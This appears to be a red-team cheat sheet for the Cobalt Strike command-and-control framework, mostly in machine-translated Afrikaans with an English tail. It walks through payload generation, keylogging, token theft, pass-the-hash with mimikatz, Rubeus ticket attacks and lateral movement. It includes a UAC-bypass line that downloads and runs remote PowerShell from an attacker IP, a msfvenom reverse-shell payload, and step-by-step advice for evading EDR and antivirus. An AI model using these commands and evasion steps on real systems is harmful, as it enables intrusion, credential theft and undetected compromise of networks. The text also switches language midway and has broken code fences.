# Cobalt Strike

### Luisteraars

### C2 Luisteraars

`Cobalt Strike -> Luisteraars -> Voeg by/Wysig` dan kan jy kies waar om te luister, watter soort beacon om te gebruik (http, dns, smb...) en meer.

### Peer2Peer Luisteraars

Die beacons van hierdie luisteraars hoef nie direk met die C2 te kommunikeer nie, hulle kan met dit kommunikeer deur ander beacons.

`Cobalt Strike -> Luisteraars -> Voeg by/Wysig` dan moet jy die TCP of SMB beacons kies.

* Die **TCP beacon sal 'n luisteraar in die geselekteerde poort stel**. Om met 'n TCP beacon te verbind, gebruik die opdrag `connect <ip> <port>` vanaf 'n ander beacon.
* Die **smb beacon sal luister in 'n pipenaam met die geselekteerde naam**. Om met 'n SMB beacon te verbind, moet jy die opdrag `link [target] [pipe]` gebruik.

### Genereer & Gasheer payloads

#### Genereer payloads in lêers

`Aanvalle -> Pakkette ->`

* **`HTMLApplication`** vir HTA lêers
* **`MS Office Macro`** vir 'n kantoor dokument met 'n makro
* **`Windows Executable`** vir 'n .exe, .dll of diens .exe
* **`Windows Executable (S)`** vir 'n **stageless** .exe, .dll of diens .exe (beter stageless as staged, minder IoCs)

#### Genereer & Gasheer payloads

`Aanvalle -> Web Drive-by -> Scripted Web Delivery (S)` Dit sal 'n script/executable genereer om die beacon van cobalt strike af te laai in formate soos: bitsadmin, exe, powershell en python.

#### Gasheer Payloads

As jy reeds die lêer het wat jy in 'n webbediener wil gasheer, gaan net na `Aanvalle -> Web Drive-by -> Gasheer Lêer` en kies die lêer om te gasheer en webbediener konfigurasie.

### Beacon Opsies

<pre class="language-bash"><code class="lang-bash"># Voer plaaslike .NET binêre uit
execute-assembly </path/to/executable.exe>
# Let daarop dat om assemblies groter as 1MB te laai, die 'tasks_max_size' eienskap van die malleable profiel gewysig moet word.

# Skermskote
printscreen    # Neem 'n enkele skermskoot via PrintScr metode
screenshot     # Neem 'n enkele skermskoot
screenwatch    # Neem periodieke skermskote van desktop
## Gaan na View -> Skermskote om hulle te sien

# sleutellogger
keylogger [pid] [x86|x64]
## View > Keystrokes om die getypte sleutels te sien

# poortskandering
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Spuit portscan aksie binne 'n ander proses
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Importeer Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <skryf net powershell cmd hier> # Dit gebruik die hoogste ondersteunde powershell weergawe (nie oppsec nie)
powerpick <cmdlet> <args> # Dit skep 'n sakrifisiale proses gespesifiseer deur spawnto, en spuit UnmanagedPowerShell daarin vir beter opsec (nie logging nie)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # Dit spuit UnmanagedPowerShell in die gespesifiseerde proses om die PowerShell cmdlet uit te voer.

# Gebruiker impersonasie
## Token generasie met kredensiale
make_token [DOMAIN\user] [password] #Skep token om 'n gebruiker in die netwerk te impersonate
ls \\computer_name\c$ # Probeer om die gegenereerde token te gebruik om toegang tot C$ in 'n rekenaar te verkry
rev2self # Stop om die token wat met make_token gegenereer is te gebruik
## Die gebruik van make_token genereer gebeurtenis 4624: 'n rekening is suksesvol aangemeld. Hierdie gebeurtenis is baie algemeen in 'n Windows-domein, maar kan beperk word deur op die Aanmeldtipe te filter. Soos hierbo genoem, gebruik dit LOGON32_LOGON_NEW_CREDENTIALS wat tipe 9 is.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steel token van pid
## Soos make_token maar steel die token van 'n proses
steal_token [pid] # Ook, dit is nuttig vir netwerk aksies, nie plaaslike aksies nie
## Uit die API dokumentasie weet ons dat hierdie aanmeldtipe "die oproeper toelaat om sy huidige token te kloon". Dit is waarom die Beacon-uitset sê Impersonated <current_username> - dit impersonate ons eie gekloonde token.
ls \\computer_name\c$ # Probeer om die gegenereerde token te gebruik om toegang tot C$ in 'n rekenaar te verkry
rev2self # Stop om die token van steal_token te gebruik

## Begin proses met nuwe kredensiale
spawnas [domain\username] [password] [listener] #Doen dit vanaf 'n gids met lees toegang soos: cd C:\
## Soos make_token, sal dit Windows gebeurtenis 4624 genereer: 'n rekening is suksesvol aangemeld maar met 'n aanmeldtipe van 2 (LOGON32_LOGON_INTERACTIVE). Dit sal die oproep gebruiker (TargetUserName) en die geïmpersoniseerde gebruiker (TargetOutboundUserName) detail.

## Spuit in proses
inject [pid] [x64|x86] [listener]
## Vanuit 'n OpSec oogpunt: Moet nie kruis-platform inspuitings uitvoer tensy jy regtig moet nie (bv. x86 -> x64 of x64 -> x86).

## Pass die hash
## Hierdie modifikasie proses vereis die patching van LSASS geheue wat 'n hoë risiko aksie is, vereis plaaslike admin regte en is nie al te haalbaar as Protected Process Light (PPL) geaktiveer is nie.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass die hash deur mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Sonder /run, spaw mimikatz 'n cmd.exe, as jy as 'n gebruiker met Desktop loop, sal hy die shell sien (as jy as SYSTEM loop, is jy reg om te gaan)
steal_token <pid> #Steel token van proses geskep deur mimikatz

## Pass die kaartjie
## Versoek 'n kaartjie
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Skep 'n nuwe aanmeldsessie om met die nuwe kaartjie te gebruik (om nie die gecompromitteerde een te oorskry nie)
make_token <domain>\<username> DummyPass
## Skryf die kaartjie in die aanvaller masjien vanaf 'n poweshell sessie & laai dit
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass die kaartjie van SYSTEM
## Genereer 'n nuwe proses met die kaartjie
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steel die token van daardie proses
steal_token <pid>

## Onthaal kaartjie + Pass die kaartjie
### Lys kaartjies
execute-assembly C:\path\Rubeus.exe triage
### Dump interessante kaartjie deur luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Skep nuwe aanmeldsessie, let op luid en prosesid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Voeg kaartjie in genereer aanmeldsessie
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Laastens, steel die token van daardie nuwe proses
steal_token <pid>

# Laterale Beweging
## As 'n token geskep is, sal dit gebruik word
jump [method] [target] [listener]
## Metodes:
## psexec                    x86   Gebruik 'n diens om 'n Service EXE artefak uit te voer
## psexec64                  x64   Gebruik 'n diens om 'n Service EXE artefak uit te voer
## psexec_psh                x86   Gebruik 'n diens om 'n PowerShell een-liner uit te voer
## winrm                     x86   Voer 'n PowerShell skrip via WinRM uit
## winrm64                   x64   Voer 'n PowerShell skrip via WinRM uit
## wmi_msbuild               x64   wmi laterale beweging met msbuild inline c# taak (oppsec)

remote-exec [method] [target] [command] # remote-exec gee nie uitset terug nie
## Metodes:
## psexec                          Afgeleë uitvoering via Diensbeheerder
## winrm                           Afgeleë uitvoering via WinRM (PowerShell)
## wmi                             Afgeleë uitvoering via WMI

## Om 'n beacon met wmi uit te voer (dit is nie in die jump opdrag nie) laai net die beacon op en voer dit uit
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe

# Pass sessie na Metasploit - Deur luisteraar
## Op metaploit gasheer
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Op cobalt: Luisteraars > Voeg by en stel die Payload op Buitelandse HTTP. Stel die Gasheer op 10.10.5.120, die Poort op 8080 en klik Stoor.
beacon> spawn metasploit
## Jy kan slegs x86 Meterpreter sessies met die buitelandse luisteraar spaw.

# Pass sessie na Metasploit - Deur shellcode inspuiting
## Op metasploit gasheer
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Voer msfvenom uit en berei die multi/handler luisteraar voor.

## Kopieer bin lêer na cobalt strike gasheer
ps
shinject <pid> x64 C:\Payloads\msf.bin #Spuit metasploit shellcode in 'n x64 proses

# Pass metasploit sessie na cobalt strike
## Genereer stageless Beacon shellcode, gaan na Aanvalle > Pakkette > Windows Executable (S), kies die gewenste luisteraar, kies Raw as die Uitset tipe en kies Gebruik x64 payload.
## Gebruik post/windows/manage/shellcode_inject in metasploit om die gegenereerde cobalt strike shellcode in te spuit.

# Pivoting
## Maak 'n socks proxy in die spanbediener
beacon> socks 1080

# SSH verbinding
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Opsec

### Voer-Assembly uit

Die **`execute-assembly`** gebruik 'n **sakrifisiale proses** deur middel van afstand proses inspuiting om die aangeduide program uit te voer. Dit is baie luidrugtig aangesien sekere Win API's gebruik word om binne 'n proses in te spuit wat elke EDR nagaan. Daar is egter 'n paar pasgemaakte gereedskap wat gebruik kan word om iets in dieselfde proses te laai:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- In Cobalt Strike kan jy ook BOF (Beacon Object Files) gebruik: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)

Die agressor skrip `https://github.com/outflanknl/HelpColor` sal die `helpx` opdrag in Cobalt Strike skep wat kleure in opdragte sal plaas wat aandui of hulle BOFs (groen) is, of hulle is Frok&Run (geel) en soortgelyk, of hulle is Prosesuitvoering, inspuiting of soortgelyk (rooi). Dit help om te weet watter opdragte meer stil is.

### Tree as die gebruiker

Jy kan gebeurtenisse soos `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` nagaan:

- Sekuriteit EID 4624 - Gaan al die interaktiewe aanmeldings na om die gewone werksure te ken.
- Stelsel EID 12,13 - Gaan die afsluit/aanvang/slaap frekwensie na.
- Sekuriteit EID 4624/4625 - Gaan inkomende geldige/ongeldige NTLM pogings na.
- Sekuriteit EID 4648 - Hierdie gebeurtenis word geskep wanneer platte kredensiale gebruik word om aan te meld. As 'n proses dit genereer, het die binêre moontlik die kredensiale in duidelike teks in 'n konfigurasielêer of binne die kode.

Wanneer jy `jump` van cobalt strike gebruik, is dit beter om die `wmi_msbuild` metode te gebruik om die nuwe proses meer wettig te laat lyk.

### Gebruik rekenaar rekeninge

Dit is algemeen dat verdedigers vreemde gedrag wat deur gebruikers gegenereer word nagaan en **diensrekeninge en rekenaarrekeninge soos `*$` van hul monitering uitsluit**. Jy kan hierdie rekeninge gebruik om laterale beweging of regte eskalasie uit te voer.

### Gebruik stageless payloads

Stageless payloads is minder luidrugtig as staged ones omdat hulle nie 'n tweede fase van die C2 bediener hoef af te laai nie. Dit beteken dat hulle geen netwerkverkeer genereer na die aanvanklike verbinding nie, wat dit minder waarskynlik maak om deur netwerk-gebaseerde verdediging opgespoor te word.

### Tokens & Token Winkel

Wees versigtig wanneer jy tokens steel of genereer, want dit mag moontlik wees vir 'n EDR om al die tokens van al die threads op te som en 'n **token wat aan 'n ander gebruiker behoort** of selfs SYSTEM in die proses te vind.

Dit maak dit moontlik om tokens **per beacon** te stoor sodat dit nie nodig is om dieselfde token weer en weer te steel nie. Dit is nuttig vir laterale beweging of wanneer jy 'n gesteelde token verskeie kere moet gebruik:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Wanneer jy lateraal beweeg, is dit gewoonlik beter om **'n token te steel as om 'n nuwe een te genereer** of 'n pass the hash aanval uit te voer.

### Guardrails

Cobalt Strike het 'n funksie genaamd **Guardrails** wat help om die gebruik van sekere opdragte of aksies te voorkom wat deur verdedigers opgespoor kan word. Guardrails kan geconfigureer word om spesifieke opdragte te blokkeer, soos `make_token`, `jump`, `remote-exec`, en ander wat algemeen gebruik word vir laterale beweging of regte eskalasie.

Boonop bevat die repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) ook 'n paar kontroles en idees wat jy kan oorweeg voordat jy 'n payload uitvoer.

### Kaartjies enkripsie

In 'n AD wees versigtig met die enkripsie van die kaartjies. Standaard sal sommige gereedskap RC4 enkripsie vir Kerberos kaartjies gebruik, wat minder veilig is as AES en standaard op datum omgewings sal AES gebruik. Dit kan opgespoor word deur verdedigers wat vir swak enkripsie algoritmes monitor.

### Vermy Standaarde

Wanneer jy Cobalt Strike gebruik, sal die SMB pype standaard die naam `msagent_####` en `"status_####` hê. Verander daardie name. Dit is moontlik om die name van die bestaande pype van Cobalt Strike met die opdrag: `ls \\.\pipe\` na te gaan.

Boonop, met SSH sessies, word 'n pyp genaamd `\\.\pipe\postex_ssh_####` geskep. Verander dit met `set ssh_pipename "<new_name>";`.

Ook in post eksploitasie aanval kan die pype `\\.\pipe\postex_####` met `set pipename "<new_name>"` gewysig word.

In Cobalt Strike profiele kan jy ook dinge soos:

- Vermy om `rwx` te gebruik
- Hoe die proses inspuiting gedrag werk (watter API's gebruik sal word) in die `process-inject {...}` blok
- Hoe die "fork and run" werk in die `post-ex {…}` blok
- Die slaap tyd
- Die maksimum grootte van binêre wat in geheue gelaai moet word
- Die geheue voetafdruk en DLL inhoud met `stage {...}` blok
- Die netwerk verkeer

### Bypass geheue skandering

Sommige EDRs skandeer geheue vir sommige bekende malware handtekeninge. Cobalt Strike laat jou toe om die `sleep_mask` funksie as 'n BOF te wysig wat in staat sal wees om die agterdeur in geheue te enkripteer.

### Luidrugtige proc inspuitings

Wanneer jy kode in 'n proses inspuit, is dit gewoonlik baie luidrugtig, dit is omdat **geen gewone proses gewoonlik hierdie aksie uitvoer nie en omdat die maniere om dit te doen baie beperk is**. Daarom kan dit opgespoor word deur gedrag-gebaseerde opsporingstelsels. Boonop kan dit ook opgespoor word deur EDRs wat die netwerk skandeer vir **threads wat kode bevat wat nie op skyf is nie** (alhoewel prosesse soos blaaiers wat JIT gebruik dit gewoonlik het). Voorbeeld: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID en PPID verhoudings

Wanneer jy 'n nuwe proses spaw, is dit belangrik om **'n gewone ouer-kind** verhouding tussen prosesse te handhaaf om opsporing te vermy. As svchost.exec iexplorer.exe uitvoer, sal dit verdag lyk, aangesien svchost.exe nie 'n ouer van iexplorer.exe in 'n normale Windows omgewing is nie.

Wanneer 'n nuwe beacon in Cobalt Strike gespaw word, word standaard 'n proses wat **`rundll32.exe`** gebruik geskep om die nuwe luisteraar te laat loop. Dit is nie baie stil nie en kan maklik deur EDRs opgespoor word. Boonop, `rundll32.exe` word sonder enige args uitgevoer wat dit selfs meer verdag maak.

Met die volgende Cobalt Strike opdrag kan jy 'n ander proses spesifiseer om die nuwe beacon te spaw, wat dit minder opspoorbaar maak:
```bash
spawnto x86 svchost.exe
```
U kan ook hierdie instelling **`spawnto_x86` en `spawnto_x64`** in 'n profiel verander.

### Proxie-aanvallersverkeer

Aanvallers sal soms in staat moet wees om gereedskap plaaslik te loop, selfs op Linux-masjiene, en die verkeer van die slagoffers na die gereedskap te laat bereik (bv. NTLM relay).

Boonop, soms om 'n pass-the-hash of pass-the-ticket aanval uit te voer, is dit meer stealthy vir die aanvaller om **hierdie hash of kaartjie in sy eie LSASS-proses** plaaslik by te voeg en dan daarvandaan te pivot in plaas daarvan om 'n LSASS-proses van 'n slagoffer masjien te verander.

U moet egter **versigtig wees met die gegenereerde verkeer**, aangesien u dalk ongewone verkeer (kerberos?) van u backdoor-proses stuur. Hiervoor kan u na 'n blaaierproses pivot (alhoewel u dalk betrap kan word om jouself in 'n proses in te spuit, so dink aan 'n stealth manier om dit te doen).
```bash

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:

{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.

#### Resource Kit

The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modifying the detected lines one can generate a template that won't be caught.

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.

#### Function hooks | Syscall

Function hooking is a very common method of ERDs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or just jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, an optino might be more stealth then the other.

This can be set in the profile or suing the command **`syscall-method`**

However, this could also be noisy.

Some option granted by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

You could also check with functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




```bash
cd C:\Tools\neo4j\bin  
neo4j.bat console  
http://localhost:7474/ --> Verander wagwoord  
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL  

# Verander powershell  
C:\Tools\cobaltstrike\ResourceKit  
template.x64.ps1  
# Verander $var_code -> $polop  
# $x --> $ar  
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna  

#artifact kit  
cd  C:\Tools\cobaltstrike\ArtifactKit  
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
